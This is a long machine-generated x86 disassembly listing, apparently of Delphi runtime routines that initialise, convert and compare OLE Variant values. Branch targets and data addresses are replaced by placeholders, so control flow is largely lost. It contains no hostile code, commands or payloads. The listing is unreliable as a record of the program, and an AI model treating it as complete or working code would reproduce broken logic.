mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404890
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_40827c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404890
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409848
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404890
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409848
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404890
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_412208
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404780
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_412240
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404780
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_404854
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404940
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_412278
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_404780
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_40827c
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404890
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_40827c
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_404890
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_40827c
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_404890
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_408368
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_404890
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_408368
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_404890
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412c18
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_412a34
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404780
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413171
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_40475c
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_40405c
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_40475c
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_40405c
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_40475c
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_40405c
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_40475c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40405c
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_412aec
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404780
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404890
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e9a0
test ah 0x40
je r-xdata
mov eax esi
call sub_404744
mov edx eax
mov eax ebx
call sub_412b50
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_412a34
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404780
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_412a34
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404780
jmp r-xdata
jmp [ eax * 4 + jump_table_412ed9 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_40827c
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_404890
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_40827c
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_404890
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_409848
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_404890
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409848
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_404890
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_412208
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_404780
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_412240
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404780
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404854
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_412278
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404780
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_40827c
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404890
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_40827c
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_404890
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_40827c
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_404890
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_408368
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_404890
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_408368
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_404890
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412c18
jmp r-xdata
sub_413178
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4131e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f500
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_40594c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4131e9
lea eax [ ebp - 0x10 ]
call sub_40f1d8
retn
mov dx 0xd
mov ax 0x101
call sub_40e9a0
sub_4131f0
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_413178
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40594c
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_40594c
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_405934
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
mov ax [ ebx ]
call sub_4146ec
test al al
je r-xdata
mov eax esi
call sub_405934
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_40e9a0
jmp r-xdata
mov ax [ ebx ]
mov dx 0xd
call sub_40e9a0
mov eax esi
call sub_405934
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_40335c
test al al
jne r-xdata
sub_4132bc
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov ax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_405934
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_405934
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_40e9a0
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40594c
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_40594c
jmp r-xdata
jmp r-xdata
mov edx esp
mov ax [ ebx ]
call sub_4146ec
test al al
je r-xdata
mov ax [ ebx ]
mov dx 0x9
call sub_40e9a0
mov eax esi
call sub_405934
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_40335c
test al al
jne r-xdata
sub_413368
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40f15c
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_4133a4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40f15c
sub_4133c4
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40f15c
sub_4133e4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40f15c
sub_413404
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40f15c
sub_413424
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40f15c
sub_413444
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40f15c
sub_413464
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f15c
sub_413490
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_40f15c
sub_4134b4
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f15c
sub_4134e0
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f15c
sub_41350c
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f15c
sub_413538
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40f15c
sub_41359c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_40408c
pop esi
pop ebx
retn
mov eax ebx
call sub_40f15c
sub_4135c8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_404940
pop esi
pop ebx
retn
mov eax ebx
call sub_40f15c
sub_413600
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_40594c
pop esi
pop ebx
retn
mov eax ebx
call sub_40f15c
sub_41362c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_40594c
pop esi
pop ebx
retn
mov eax ebx
call sub_40f15c
sub_413658
push ebx
mov ebx eax
and bx 0xfff
cmp bx 0x14
jbe r-xdata
mov eax ebx
pop ebx
retn
cmp bx 0x100
jne r-xdata
call sub_40ea3c
mov bx 0x8
jmp r-xdata
sub_41367c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41373f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x11 ]
call sub_40f500
cmp [ esi ] 0x101
jne r-xdata
cmp [ ebx ] 0x101
jne r-xdata
lea eax [ ebp - 0x11 ]
call [ rw-data ]
mov edx ebx
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_413f30
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413746
lea eax [ ebp - 0x11 ]
call sub_40f1d8
retn
lea eax [ ebp - 0x21 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413713
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x21 ]
call sub_40f500
lea eax [ ebp - 0x21 ]
call [ rw-data ]
lea edx [ ebp - 0x21 ]
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_413f30
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x21 ]
call sub_40f1d8
retn
sub_413764
push ebx
push ecx
mov [ esp ] dl
mov bl 0x1
mov edx ecx
sub edx 0xe
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
je r-xdata
call sub_40ea90
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
sub edx 0x4
jb r-xdata
mov eax ebx
pop edx
pop ebx
retn
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40ea90
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
jmp r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40ea90
jmp r-xdata
je r-xdata
call sub_40ea3c
xor eax eax
jmp r-xdata
cmp [ esp ] 0x2
je r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ ecx * 2 + rw-data ]
jmp r-xdata
dec dl
je r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
mov al 0x1
mov al 0x1
cmp [ esp ] 0x2
jne r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov bl 0x1
jmp r-xdata
sub_413860
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn 0x10
mov al 0x1
mov al 0x2
jmp r-xdata
jmp r-xdata
sub_41389c
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_4138c4
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_4138ec
push ebp
mov ebp esp
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jbe r-xdata
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jae r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_413918
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_413973
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_4124f0
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_4124f0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407fa4
xor edx edx
call sub_41384c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41397a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
sub_413984
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov ax [ esi ]
call sub_413658
movzx eax ax
mov bl [ eax + rw-data ]
mov ax [ edi ]
call sub_413658
movzx eax ax
mov al [ eax + rw-data ]
xor edx edx
mov dl al
xor ecx ecx
mov cl bl
imul ecx ecx 0xb
add ecx rw-data
movzx edx [ ecx + edx ]
cmp edx 0xa
ja r-xdata
call sub_40ea3c
mov al 0x1
jmp [ edx * 4 + jump_table_4139d5 ]
call sub_40ea3c
mov al 0x1
jmp r-xdata
mov edx eax
mov eax ebx
call sub_413750
jmp r-xdata
mov ecx ebp
mov edx eax
mov eax ebx
call sub_413764
jmp r-xdata
mov eax edi
call sub_40fb90
push eax
mov eax esi
call sub_40fb90
pop edx
call sub_41384c
jmp r-xdata
mov eax esi
call sub_410654
push edx
push eax
mov eax edi
call sub_410654
push edx
push eax
call sub_413860
jmp r-xdata
mov eax esi
call sub_411164
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_411164
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_41389c
jmp r-xdata
mov eax esi
call sub_4118d4
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_4118d4
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_4138c4
jmp r-xdata
mov eax esi
call sub_411e3c
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax edi
call sub_411e3c
add esp 0xfffffff8
fistp [ esp ]
fwait
call sub_4138ec
jmp r-xdata
mov edx edi
mov eax esi
call sub_413918
jmp r-xdata
mov eax edi
call sub_410c50
and eax 0x7f
push eax
mov eax esi
call sub_410c50
and eax 0x7f
pop edx
call sub_41384c
jmp r-xdata
mov edx edi
mov eax esi
mov ecx ebp
call sub_41367c
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_413b10
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x9 ] 0x1
mov si [ ebx ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
test ax ax
jne r-xdata
test si si
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp ax 0x1
jne r-xdata
mov dl 0x1
xor eax eax
call sub_413750
mov [ ebp - 0x9 ] al
jmp r-xdata
cmp si 0x1
jne r-xdata
xor edx edx
mov al 0x1
call sub_413750
mov [ ebp - 0x9 ] al
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_4146ec
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x2
xor eax eax
call sub_413764
mov [ ebp - 0x9 ] al
jmp r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
call sub_4146ec
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
xor edx edx
mov al 0x2
call sub_413764
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx 0xb
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0x8 ]
test al al
je r-xdata
call sub_40ea3c
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40ea3c
jmp r-xdata
mov esi [ ebp - 0x4 ]
mov si [ esi ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413ca9
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebx ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40f7cc
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebx ]
je r-xdata
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax esi
call sub_4146ec
test al al
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413e3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f7cc
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0x28 ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413d99
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xe ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40f7cc
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_413984
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f1d8
retn
call sub_40e94c
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413c1b
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f7cc
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebp - 0xc ]
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40ea3c
jmp r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x8 ]
call sub_413984
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f1d8
retn
call sub_40e94c
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f1d8
retn
call sub_40e94c
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f1d8
retn
call sub_40e94c
call sub_40ea3c
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413ef1
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f7cc
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f1d8
retn
call sub_40e94c
sub_413f30
push esi
push edi
mov si [ eax ]
mov di [ edx ]
cmp si 0x10f
jae r-xdata
cmp si 0x400c
jne r-xdata
cmp di 0x10f
jae r-xdata
cmp di 0x400c
jne r-xdata
mov eax [ eax + 0x8 ]
call sub_413f30
jmp r-xdata
call sub_413984
pop edi
pop esi
retn
and si 0xfff
cmp si 0x10f
jae r-xdata
mov edx [ edx + 0x8 ]
call sub_413f30
jmp r-xdata
pop edi
pop esi
retn
call sub_413b10
and di 0xfff
